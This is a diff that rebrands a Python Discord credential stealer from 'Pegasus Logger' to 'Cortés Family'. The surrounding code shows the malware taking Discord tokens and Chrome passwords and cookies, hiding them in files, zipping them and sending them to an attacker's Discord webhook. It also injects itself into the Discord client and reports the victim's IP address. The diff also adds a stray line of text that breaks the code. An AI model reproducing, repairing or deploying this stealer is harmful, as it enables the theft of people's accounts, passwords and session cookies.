@@ -36,7 +36,7 @@ def main(webhook_url):
 	global webhook, embed
 
 	webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
-	embed = Embed(title="Pegasus Logger", color=15535980)
+	embed = Embed(title="Cortés Family", color=15535980)
 	
 	get_inf()
 	grabtokens()
@@ -55,17 +55,17 @@ def main(webhook_url):
 			t.join()
 		
 	embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
-	embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
-	embed.set_thumbnail(url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png")
+	embed.set_footer(text="Cortés Family | Made by aleenaswrldd")
+	embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1041182399096180869/1090814098440200324/jesus.jpg")
 
 	zipup()
 		
 	file = None
 	file = File(f'files-{os.getenv("UserName")}.zip')
 	
-	webhook.send(content="||@here|| <http://www.addidix.xyz>", embed=embed, file=file, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")
+	webhook.send(content="||@here||", embed=embed, file=file, avatar_url="https://cdn.discordapp.com/attachments/1041182399096180869/1090814098440200324/jesus.jpg", username="Cortés Family")
 	
-def pegasus():
+def CortésFamily():
 	for func in {
 		main(WEBHOOK_URL), 
 		inject(WEBHOOK_URL),
@@ -275,9 +275,9 @@ class password():
 		self.roaming = os.getenv("appdata")
 
 		with open("google-passwords.txt", "w") as f:
-			f.write("pegasus /// Google Chrome Passwords\n\n")
+			f.write("CortésFamily /// Google Chrome Passwords\n\n")
 		hide(".\\google-passwords.txt")
-		
+		Cortés Family
 		if os.path.exists(self.appdata+'\\Google'):
 			self.grabPassword_chrome() 
 		
@@ -358,7 +358,7 @@ class cookies():
 		self.appdata = os.getenv("localappdata")
 		
 		with open(".\\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
-			f.write("pegasus /// Google Chrome Cookies\n\n")
+			f.write("Cortés Family /// Google Chrome Cookies\n\n")
 		hide(".\\google-cookies.txt")
 		
 		if os.path.exists(self.appdata+'\\Google'):
@@ -469,13 +469,13 @@ def inject(webhook_url):
 			index = indexFile.read()
 			if webhook_url in index:
 				webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
-				embed = Embed(title="Pegasus Logger", color=15535980)
+				embed = Embed(title="Cortés Family", color=15535980)
 
-				embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
-				embed.set_thumbnail(url="https://images-ext-2.discordapp.net/external/8_XRBxiJdDcKXyUMqNwDiAtIb8lt70DaUHRiUd_bsf4/https/i.imgur.com/q1NJvOx.png")
+				embed.set_footer(text="Cortés Family | Made by aleenaswrldd")
+				embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1041182399096180869/1090814098440200324/jesus.jpg")
 				embed.add_field(name="Injection", value=f"Successfully injected into Discord\n\nUser: {os.getenv('UserName')}\nIP: {requests.get('http://ipinfo.io/json').json()['ip']}", inline=False)
 	
-				webhook.send(embed=embed, avatar_url="https://media.discordapp.net/attachments/798245111070851105/930314565454004244/IMG_2575.jpg", username="Pegasus")
+				webhook.send(embed=embed, avatar_url="https://cdn.discordapp.com/attachments/1041182399096180869/1090814098440200324/jesus.jpg", username="Cortés Family")
 				
 class debug:
 	def __init__(self):
@@ -538,7 +538,7 @@ if __name__ == '__main__':
 	if os.name != "nt":
 		exit()
 	
-	try: debug(); pegasus()
+	try: debug(); CortésFamily()
 	except:
 		try: cleanup()
 		except: exit()
